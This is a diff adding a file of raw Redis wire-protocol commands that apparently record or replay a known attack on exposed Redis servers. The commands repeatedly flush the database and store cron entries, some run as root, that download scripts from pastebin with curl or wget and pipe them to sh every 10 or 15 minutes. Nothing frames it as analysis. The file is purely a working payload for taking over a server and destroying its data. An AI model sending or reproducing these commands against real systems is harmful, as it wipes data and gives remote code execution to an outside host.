@@ -1,0 +1,115 @@
+*2
+$6
+SELECT
+$1
+0
+*1
+$8
+flushall
+*3
+$3
+set
+$6
+caches
+$70
+
+*/10 * * * * root curl -fsSL https://pastebin.com/raw/60T3uCcb|sh
+##
+
+*3
+$3
+set
+$7
+runtime
+$71
+
+*/15 * * * * root wget -q -O- https://pastebin.com/raw/60T3uCcb|sh
+##
+
+*3
+$3
+set
+$6
+caches
+$65
+
+*/10 * * * * curl -fsSL https://pastebin.com/raw/60T3uCcb|sh
+##
+
+*3
+$3
+set
+$7
+runtime
+$66
+
+*/15 * * * * wget -q -O- https://pastebin.com/raw/60T3uCcb|sh
+##
+
+*1
+$8
+flushall
+*3
+$3
+set
+$6
+caches
+$70
+
+*/10 * * * * root curl -fsSL https://pastebin.com/raw/60T3uCcb|sh
+##
+
+*3
+$3
+set
+$7
+runtime
+$71
+
+*/15 * * * * root wget -q -O- https://pastebin.com/raw/60T3uCcb|sh
+##
+
+*3
+$3
+set
+$6
+caches
+$65
+
+*/10 * * * * curl -fsSL https://pastebin.com/raw/60T3uCcb|sh
+##
+
+*3
+$3
+set
+$7
+runtime
+$66
+
+*/15 * * * * wget -q -O- https://pastebin.com/raw/60T3uCcb|sh
+##
+
+*1
+$8
+flushall
+*3
+$3
+set
+$6
+SwE3SC
+$118
+	
+*/10 * * * * root (curl -fsSL https://pastebin.com/raw/1NtRkBc3||wget -q -O- https://pastebin.com/raw/1NtRkBc3)|sh
+	
+*3
+$3
+set
+$6
+NysX7D
+$113
+	
+*/15 * * * * (curl -fsSL https://pastebin.com/raw/1NtRkBc3||wget -q -O- https://pastebin.com/raw/1NtRkBc3)|sh
+	
+*1
+$8
+flushall
